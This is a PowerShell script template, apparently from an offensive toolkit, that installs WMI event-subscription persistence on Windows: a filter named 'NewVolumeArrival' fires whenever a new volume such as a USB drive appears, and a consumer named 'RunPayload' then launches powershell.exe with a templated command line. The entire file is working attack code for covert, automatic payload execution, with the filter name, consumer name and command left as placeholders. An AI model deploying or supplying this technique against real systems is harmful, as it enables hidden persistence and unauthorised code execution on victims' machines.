#$FilterName = 'NewVolumeArrival'
#$ConsumerName = 'RunPayload'
$ExecutablePath = (Get-Command powershell.exe).('Definition')
#$CommandLineTemplate = " " + "<#CommandLine#>"

$Query = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA `"Win32_Volume`"";
try {
    Get-WmiObject __EventFilter -NameSpace ROOT\subscription -Filter ("Name='" + "$FilterName" + "'") | Remove-WmiObject
} finally {
    $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace ROOT\subscription -Arguments @{Name="$FilterName";EventNameSpace='root\cimv2';QueryLanguage='WQL';Query=$Query};
}

try {
    Get-WmiObject CommandLineEventConsumer -NameSpace ROOT\subscription -Filter ("Name='" + "$ConsumerName" + "'") | Remove-WmiObject
} finally {
    $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace ROOT\subscription -Arguments @{Name="$ConsumerName";CommandLineTemplate="$CommandLineTemplate";ExecutablePath=$ExecutablePath};
}

try {
    Get-WmiObject __FilterToConsumerBinding -NameSpace ROOT\subscription | Where-Object {$_.Filter.Contains("$FilterName")} | Remove-WmiObject
} finally {
    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace ROOT\subscription -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} | Out-Null;
}